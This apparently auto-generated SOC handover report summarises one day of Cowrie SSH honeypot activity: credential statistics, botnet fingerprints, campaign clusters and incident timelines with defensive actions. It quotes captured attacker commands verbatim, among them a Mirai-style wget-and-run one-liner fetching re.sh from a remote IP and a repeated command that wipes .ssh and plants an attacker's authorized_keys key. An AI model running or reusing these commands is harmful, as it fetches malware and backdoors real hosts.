# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-18 |
| **Generated At** | 2026-11-18T19:45:02Z |
| **Shift Time** | 19:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **341** |
| Confirmed Threats | **281** |
| False Positives Filtered | **60** (17.6%) |
| Unique Attacker IPs | **211** |
| Countries of Origin | **46** |
| High Severity Cases | **183** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **158** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2516** |
| Unique Credential Pairs | **1397** |
| Unique Usernames | **444** |
| Unique Passwords | **955** |
| Successful Auth Pairs | **2337** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 939 |
| `admin` | 89 |
| `ubuntu` | 61 |
| `rootssssss23424123123` | 50 |
| `user` | 46 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 121 |
| `123` | 67 |
| `rootssssss23424123123` | 50 |
| `root3245gs5662d34111111111` | 50 |
| `1234` | 50 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 50 |
| `root` | `root3245gs5662d34111111111` | 40 |
| `support` | `support` | 26 |
| `admin` | `` | 24 |
| `usuario` | `usuario` | 12 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin33` | `75.110.163.160` | 2026-11-18T04:56:16 |
| `admin` | `admin33` | `106.13.137.17` | 2026-11-18T04:56:33 |
| `Unknown` | `22222222` | `10.0.0.73` | 2026-11-18T04:56:52 |
| `root` | `zxcvbnm` | `220.118.190.204` | 2026-11-18T04:57:28 |
| `root` | `zxcvbnm` | `187.51.219.26` | 2026-11-18T04:57:42 |
| `support` | `support` | `10.0.0.73` | 2026-11-18T05:10:11 |
| `root` | `1111111111` | `98.17.200.45` | 2026-11-18T05:10:22 |
| `support` | `support` | `176.53.159.196` | 2026-11-18T05:17:19 |
| `root` | `ubuntu1404` | `208.53.97.144` | 2026-11-18T05:21:10 |
| `root` | `rasplex` | `208.53.97.144` | 2026-11-18T05:21:11 |
| `admin` | `1988` | `208.53.97.144` | 2026-11-18T05:21:11 |
| `device` | `apc` | `208.53.97.144` | 2026-11-18T05:21:12 |
| `admin` | `Symbol` | `208.53.97.144` | 2026-11-18T05:21:13 |
| `leo` | `leo` | `208.53.97.144` | 2026-11-18T05:21:15 |
| `pyimagesearch` | `deeplearning` | `208.53.97.144` | 2026-11-18T05:21:16 |
| `Administrator` | `p@ssw0rd` | `208.53.97.144` | 2026-11-18T05:21:17 |
| `geosolutions` | `Geos` | `208.53.97.144` | 2026-11-18T05:21:17 |
| `ftp` | `video` | `208.53.97.144` | 2026-11-18T05:21:18 |
| `config` | `config88` | `10.0.0.73` | 2026-11-18T05:22:07 |
| `config` | `config2016` | `10.0.0.73` | 2026-11-18T05:23:31 |
_… 2317 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **341** |
| Sessions with Fingerprint | **26** |
| Unique HASSH Fingerprints | **26** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 85 |
| Go SSH scanner | 80 |
| OpenSSH | 36 |
| Paramiko (Python) | 3 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 62 | 32 |
| `acaa53e0a7d7...` | Mirai/variant | 33 | 33 |
| `2ec37a7cc8da...` | Mirai/variant | 20 | 2 |
| `7d01d047ace6...` | Mirai/variant | 18 | 4 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 62 | 32 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 33 | 33 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 20 | 2 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 18 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 8 | 1 | Mirai/variant |
| `a591c4ddccc9...` | libssh | 7 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 6 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **32** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 57 | 32 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
ls /
```
```
cd /tmp || cd /var/run || cd /dev/shm || cd /; wget http://91.186.209.228/re.sh; busybox wget http://91.186.209.228/re.sh; chmod 777 re.sh; sh re.sh
```
Source IPs: `146.196.81.148`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `89.134.194.84`, `34.40.145.110`, `183.91.11.36`, `195.158.24.43`, `189.217.130.86`, `129.121.117.162`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **211** |
| Unique ASNs | **101** |
| High-Risk ASNs | **80** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 57 | HIGH |
| `AS396982` | Google LLC | 9 | HIGH |
| `AS4766` | Korea Telecom | 8 | HIGH |
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 5 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (169)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b72f904b2d7f

| Field | Detail |
|---|---|
| **Source IP** | `75.110.163[.]160` |
| **First Seen** | 2026-11-18 04:56 |
| **Last Seen** | 2026-11-18 04:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 04:56:11` | `cowrie.session.connect` |
| `2026-11-18 04:56:12` | `cowrie.client.version` |
| `2026-11-18 04:56:12` | `cowrie.client.kex` |
| `2026-11-18 04:56:16` | `cowrie.login.success` |
| `2026-11-18 04:56:17` | `cowrie.direct-tcpip.request` |
| `2026-11-18 04:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.110.163[.]160` to AbuseIPDB if not already reported
- [ ] Block `75.110.163[.]160` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612384866269

| Field | Detail |
|---|---|
| **Source IP** | `106.13.137[.]17` |
| **First Seen** | 2026-11-18 04:56 |
| **Last Seen** | 2026-11-18 04:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 04:56:28` | `cowrie.session.connect` |
| `2026-11-18 04:56:29` | `cowrie.client.version` |
| `2026-11-18 04:56:29` | `cowrie.client.kex` |
| `2026-11-18 04:56:33` | `cowrie.login.success` |
| `2026-11-18 04:56:35` | `cowrie.direct-tcpip.request` |
| `2026-11-18 04:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.137[.]17` to AbuseIPDB if not already reported
- [ ] Block `106.13.137[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4528d974a9d0

| Field | Detail |
|---|---|
| **Source IP** | `220.118.190[.]204` |
| **First Seen** | 2026-11-18 04:57 |
| **Last Seen** | 2026-11-18 04:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 04:57:24` | `cowrie.session.connect` |
| `2026-11-18 04:57:25` | `cowrie.client.version` |
| `2026-11-18 04:57:25` | `cowrie.client.kex` |
| `2026-11-18 04:57:28` | `cowrie.login.success` |
| `2026-11-18 04:57:28` | `cowrie.direct-tcpip.request` |
| `2026-11-18 04:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.190[.]204` to AbuseIPDB if not already reported
- [ ] Block `220.118.190[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747c78e831c2

| Field | Detail |
|---|---|
| **Source IP** | `187.51.219[.]26` |
| **First Seen** | 2026-11-18 04:57 |
| **Last Seen** | 2026-11-18 04:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 04:57:39` | `cowrie.session.connect` |
| `2026-11-18 04:57:40` | `cowrie.client.version` |
| `2026-11-18 04:57:40` | `cowrie.client.kex` |
| `2026-11-18 04:57:42` | `cowrie.login.success` |
| `2026-11-18 04:57:43` | `cowrie.direct-tcpip.request` |
| `2026-11-18 04:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.51.219[.]26` to AbuseIPDB if not already reported
- [ ] Block `187.51.219[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f979027d5b9

| Field | Detail |
|---|---|
| **Source IP** | `98.17.200[.]45` |
| **First Seen** | 2026-11-18 05:10 |
| **Last Seen** | 2026-11-18 05:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:10:21` | `cowrie.session.connect` |
| `2026-11-18 05:10:21` | `cowrie.client.version` |
| `2026-11-18 05:10:21` | `cowrie.client.kex` |
| `2026-11-18 05:10:22` | `cowrie.login.success` |
| `2026-11-18 05:10:22` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.17.200[.]45` to AbuseIPDB if not already reported
- [ ] Block `98.17.200[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc3d63cbe35

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-18 05:17 |
| **Last Seen** | 2026-11-18 05:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:17:19` | `cowrie.session.connect` |
| `2026-11-18 05:17:19` | `cowrie.client.version` |
| `2026-11-18 05:17:19` | `cowrie.client.kex` |
| `2026-11-18 05:17:19` | `cowrie.login.success` |
| `2026-11-18 05:17:19` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:17:19` | `cowrie.direct-tcpip.data` |
| `2026-11-18 05:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ac2d156257

| Field | Detail |
|---|---|
| **Source IP** | `208.53.97[.]144` |
| **First Seen** | 2026-11-18 05:21 |
| **Last Seen** | 2026-11-18 05:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo TELNET_TEST_OK` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:21:10` | `cowrie.session.connect` |
| `2026-11-18 05:21:10` | `cowrie.telnet.option` |
| `2026-11-18 05:21:10` | `cowrie.telnet.option` |
| `2026-11-18 05:21:10` | `cowrie.telnet.option` |
| `2026-11-18 05:21:10` | `cowrie.login.success` |
| `2026-11-18 05:21:11` | `cowrie.session.params` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.telnet.option` |
| `2026-11-18 05:21:13` | `cowrie.command.input` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `208.53.97[.]144` to AbuseIPDB if not already reported
- [ ] Block `208.53.97[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f33bc2bf0e

| Field | Detail |
|---|---|
| **Source IP** | `50.6.205[.]37` |
| **First Seen** | 2026-11-18 05:25 |
| **Last Seen** | 2026-11-18 05:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:25:55` | `cowrie.session.connect` |
| `2026-11-18 05:25:55` | `cowrie.client.version` |
| `2026-11-18 05:25:55` | `cowrie.client.kex` |
| `2026-11-18 05:25:55` | `cowrie.login.success` |
| `2026-11-18 05:25:55` | `cowrie.session.params` |
| `2026-11-18 05:25:55` | `cowrie.command.input` |
| `2026-11-18 05:25:55` | `cowrie.command.failed` |
| `2026-11-18 05:25:55` | `cowrie.log.closed` |
| `2026-11-18 05:25:56` | `cowrie.session.params` |
| `2026-11-18 05:25:56` | `cowrie.command.input` |
| `2026-11-18 05:25:56` | `cowrie.session.file_download` |
| `2026-11-18 05:25:56` | `cowrie.log.closed` |
| `2026-11-18 05:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.205[.]37` to AbuseIPDB if not already reported
- [ ] Block `50.6.205[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549334536e23

| Field | Detail |
|---|---|
| **Source IP** | `50.6.205[.]37` |
| **First Seen** | 2026-11-18 05:25 |
| **Last Seen** | 2026-11-18 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:25:56` | `cowrie.session.connect` |
| `2026-11-18 05:25:56` | `cowrie.client.version` |
| `2026-11-18 05:25:56` | `cowrie.client.kex` |
| `2026-11-18 05:25:56` | `cowrie.login.success` |
| `2026-11-18 05:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.205[.]37` to AbuseIPDB if not already reported
- [ ] Block `50.6.205[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-416e12e48eff

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-11-18 05:27 |
| **Last Seen** | 2026-11-18 05:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:27:49` | `cowrie.session.connect` |
| `2026-11-18 05:27:49` | `cowrie.client.version` |
| `2026-11-18 05:27:49` | `cowrie.client.kex` |
| `2026-11-18 05:27:49` | `cowrie.login.success` |
| `2026-11-18 05:27:50` | `cowrie.session.params` |
| `2026-11-18 05:27:50` | `cowrie.command.input` |
| `2026-11-18 05:27:50` | `cowrie.command.failed` |
| `2026-11-18 05:27:50` | `cowrie.log.closed` |
| `2026-11-18 05:27:51` | `cowrie.session.params` |
| `2026-11-18 05:27:51` | `cowrie.command.input` |
| `2026-11-18 05:27:51` | `cowrie.session.file_download` |
| `2026-11-18 05:27:51` | `cowrie.log.closed` |
| `2026-11-18 05:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5db35b6a2abb

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-11-18 05:27 |
| **Last Seen** | 2026-11-18 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:27:51` | `cowrie.session.connect` |
| `2026-11-18 05:27:51` | `cowrie.client.version` |
| `2026-11-18 05:27:51` | `cowrie.client.kex` |
| `2026-11-18 05:27:51` | `cowrie.login.success` |
| `2026-11-18 05:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3a4f3ed9e7

| Field | Detail |
|---|---|
| **Source IP** | `129.121.99[.]2` |
| **First Seen** | 2026-11-18 05:28 |
| **Last Seen** | 2026-11-18 05:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:28:55` | `cowrie.session.connect` |
| `2026-11-18 05:28:55` | `cowrie.client.version` |
| `2026-11-18 05:28:55` | `cowrie.client.kex` |
| `2026-11-18 05:28:55` | `cowrie.login.success` |
| `2026-11-18 05:28:55` | `cowrie.session.params` |
| `2026-11-18 05:28:55` | `cowrie.command.input` |
| `2026-11-18 05:28:55` | `cowrie.command.failed` |
| `2026-11-18 05:28:55` | `cowrie.log.closed` |
| `2026-11-18 05:28:56` | `cowrie.session.params` |
| `2026-11-18 05:28:56` | `cowrie.command.input` |
| `2026-11-18 05:28:56` | `cowrie.session.file_download` |
| `2026-11-18 05:28:56` | `cowrie.log.closed` |
| `2026-11-18 05:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `129.121.99[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde50e0eaaa1

| Field | Detail |
|---|---|
| **Source IP** | `129.121.99[.]2` |
| **First Seen** | 2026-11-18 05:28 |
| **Last Seen** | 2026-11-18 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:28:56` | `cowrie.session.connect` |
| `2026-11-18 05:28:56` | `cowrie.client.version` |
| `2026-11-18 05:28:56` | `cowrie.client.kex` |
| `2026-11-18 05:28:56` | `cowrie.login.success` |
| `2026-11-18 05:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `129.121.99[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f01e727cba4

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-11-18 05:34 |
| **Last Seen** | 2026-11-18 05:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:34:31` | `cowrie.session.connect` |
| `2026-11-18 05:34:31` | `cowrie.client.version` |
| `2026-11-18 05:34:31` | `cowrie.client.kex` |
| `2026-11-18 05:34:32` | `cowrie.login.success` |
| `2026-11-18 05:34:33` | `cowrie.session.params` |
| `2026-11-18 05:34:33` | `cowrie.command.input` |
| `2026-11-18 05:34:33` | `cowrie.command.failed` |
| `2026-11-18 05:34:34` | `cowrie.log.closed` |
| `2026-11-18 05:34:35` | `cowrie.session.params` |
| `2026-11-18 05:34:35` | `cowrie.command.input` |
| `2026-11-18 05:34:35` | `cowrie.session.file_download` |
| `2026-11-18 05:34:35` | `cowrie.log.closed` |
| `2026-11-18 05:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

